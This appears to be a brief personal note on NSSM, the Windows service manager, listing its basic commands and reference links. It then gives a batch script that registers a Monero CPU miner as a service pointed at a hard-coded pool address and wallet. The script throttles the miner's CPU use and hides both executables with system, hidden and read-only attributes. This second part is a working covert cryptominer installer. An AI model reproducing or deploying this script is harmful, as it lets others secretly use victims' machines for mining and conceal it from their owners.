`NSSM - the Non-Sucking Service Manager`

```
shell> nssm install
```
<img src="http://i.imgur.com/80lhkUy.png" alt="nssm" width=300>

```
shell> nssm install <servicename> <program> [<arguments>]
shell> nssm start <servicename>
shell> nssm stop <servicename>
shell> nssm status <servicename>
shell> nssm remove <servicename>
```

#### :books: 參考網站：
- https://nssm.cc/
- https://nssm.cc/commands

---

```
@echo off 

set xmrAddress=47HtbDvpVQwDsiegiDZqYxcQEDZtj3DGxHcdeaqem4jqQxkBQtpxgopUZ5oVg2HaWfTjGye2MBZZJTPvDpeL1Koq5ZtaFH1
set poolPassword=x
set poolUrl=stratum+tcp://198.251.81.82:3333

nssm install NsCpuCNMiner64 NsCpuCNMiner64.exe -o %poolUrl% -u %xmrAddress% -p %poolPassword% -dbg -1 -lowcpu 2
nssm start NsCpuCNMiner64

@attrib +s +h +r NsCpuCNMiner64.exe
@attrib +s +h +r nssm.exe
```
